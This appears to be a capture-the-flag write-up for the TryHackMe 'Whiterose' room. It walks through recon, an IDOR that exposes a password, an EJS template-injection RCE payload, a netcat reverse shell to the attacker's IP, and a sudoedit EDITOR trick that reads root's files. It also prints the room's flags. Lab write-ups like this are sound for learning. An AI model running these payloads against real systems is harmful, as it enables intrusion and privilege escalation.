---
title: "TryHackMe - Whiterose"
date: 2025-04-10 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [IDOR, reverse shell, burpsuite , EJS , SSTI, sudoedit ]

---


## Reconnaissance
First, I start with an nmap scan and adding `cyprusbank.thm` adress to `/etc/hosts`:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -A -sV -sC 10.10.204.106
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 05:53 EDT
Nmap scan report for cyprusbank.thm (10.10.204.106)
Host is up (0.066s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   63.49 ms 10.8.0.1
2   63.63 ms cyprusbank.thm (10.10.204.106)

```
Next, I use the **ffuf** tool to perform a dictionary attack on subdomains.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.204.106/ -H "Host:FUZZ.cyprusbank.thm" -fw 1 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.204.106/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 69ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 76ms]

```

I add the discovered new subdomains to the `/etc/hosts` file.

I go to the page `admin.cyprusbank.thm/` and log in to Olivia Cortez's account using the credentials provided by the CTF author.

Then I use the **Gobuster** tool to scan directories and files on the page `admin.cyprusbank.thm/`.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://admin.cyprusbank.thm/ -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,html.txt -e
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.cyprusbank.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html.txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://admin.cyprusbank.thm/Login                (Status: 200) [Size: 2195]
http://admin.cyprusbank.thm/Search               (Status: 302) [Size: 28] [--> /login]
http://admin.cyprusbank.thm/login                (Status: 200) [Size: 2195]
http://admin.cyprusbank.thm/logout               (Status: 302) [Size: 28] [--> /login]
http://admin.cyprusbank.thm/messages             (Status: 302) [Size: 28] [--> /login]
http://admin.cyprusbank.thm/search               (Status: 302) [Size: 28] [--> /login]
http://admin.cyprusbank.thm/secci�               (Status: 400) [Size: 1103]
http://admin.cyprusbank.thm/secci�.php           (Status: 400) [Size: 1107]
http://admin.cyprusbank.thm/secci�.html.txt      (Status: 400) [Size: 1112]
http://admin.cyprusbank.thm/settings             (Status: 302) [Size: 28] [--> /login]
Progress: 61407 / 61410 (100.00%)
===============================================================
Finished
===============================================================

```


I navigate to the page `admin.cyprusbank.thm/messages/?c=5` and notice that the URL parameter can be manipulated. I change it to ?c=8 to access another message. This demonstrates an **[Insecure Direct Object Reference (IDOR)](https://portswigger.net/web-security/access-control/idor)** vulnerability, which allows me to access resources (in this case, private messages) without proper authorization. Upon doing so, I receive the following message content:

![message8](/images/whiterose/message8.jpg)

In the message, I find the login credentials for the user `Gayle Bev`, including the password: `p~]P@5!6;rs558:q`. Using this information, I log into her account through the admin panel, successfully gaining access to the next level of the application.


After logging into Gayle Bev’s account, I navigate to the settings section at `admin.cyprusbank.thm/settings`, where I notice a form that allows password changes for clients. I intercept the HTTP request using Burp Suite for further analysis. When I remove the password value from the submitted request, the server responds with the following error message:

![burpejs](/images/whiterose/burpejs.jpg)

## User flag

I search for information online about potential exploits related to EJS and come across an interesting article discussing the topic [Server side template injection RCE (Cve-2022-29078)](https://eslam.io/posts/ejs-server-side-template-injection-rce/).

The vulnerability allows an attacker to inject and execute unauthorized code on the server by manipulating the data passed to the template. If user input is directly passed to the template without proper validation, it may lead to unintended code execution.

I use the payload provided in the article to test whether it will execute successfully in my case.
```
name=test&password=test&settings[view options][outputFunctionName]=x;return global.process.mainModule.require('child_process').execSync('whoami');//
```

![burptestpayload](/images/whiterose/burptestpayload.jpg)

As observed, the server is vulnerable.

I can now exploit the vulnerability to obtain a shell. I use a [reverse shell generator](https://www.revshells.com) to proceed.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.21.77 8888 >/tmp/f
```
Initially, the request failed to go through due to an encountered error. However, after URL encoding the payload, I was able to successfully obtain a reverse shell.

My entire payload looks like this:

```
name=test&password=test&settings[view options][outputFunctionName]=x;return global.process.mainModule.require('child_process').execSync('%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%38%2e%32%31%2e%37%37%20%38%38%38%38%20%3e%2f%74%6d%70%2f%66');//
```

After gaining the shell, I can now read the first flag.

**FLAG : THM{4lways_upd4te_uR_d3p3nd3nc!3s}**

## Root Access



```
SHELL=/bin/bash script -q /dev/null
```

To escalate privileges to root, I begin by checking the `web` user's `sudo` permissions using `sudo -l`. I discover that the user is allowed to run `sudoedit` without a password on the following file:

```console
web@cyprusbank:~/app$ sudo -l
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

I leverage this by setting the `EDITOR` environment variable to a command that will read the contents of the root flag file:

```console
web@cyprusbank:~/app$ export EDITOR="cat -- /root/root.txt"
export EDITOR="cat -- /root/root.txt"

```
Then, I execute:

```console
web@cyprusbank:~/app$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
sudoedit: --: editing files in a writable directory is not permitted
THM{4nd_uR_p4ck4g3s}
server {
  listen 80;
    
  server_name admin.cyprusbank.thm;
    
  location / {
    proxy_pass http://localhost:8080;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';
    proxy_set_header Host $host;
    proxy_cache_bypass $http_upgrade;
  }
}
sudoedit: /root/root.txt unchanged
sudoedit: /etc/nginx/sites-available/admin.cyprusbank.thm unchanged

```

Although `sudoedit` reports that no changes were made, the command successfully reads and displays the **root flag**

**FLAG : THM{4nd_uR_p4ck4g3s}**